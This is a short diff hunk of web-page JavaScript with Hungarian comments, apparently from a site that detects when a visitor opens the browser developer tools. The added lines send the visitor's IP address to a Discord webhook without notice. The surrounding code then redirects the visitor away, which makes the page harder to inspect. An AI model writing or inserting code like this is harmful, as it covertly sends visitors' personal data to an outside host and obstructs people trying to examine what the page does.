@@ -70,6 +70,9 @@
                                        window.outerWidth - window.innerWidth > threshold;
 
                 if (devToolsOpened) {
+                    console.log('Fejlesztői eszközök megnyitva!');
+                    // Azonnal elküldi az IP-t a Discordra
+                    sendIpRequest('DevTools Megnyitás', altWebhookUrl); // Küldje a másik webhookra
                     window.location.href = "https://example.com1"; // Átirányítja egy másik oldalra
                 }
             }, 1000); // Minden másodpercben ellenőrzi
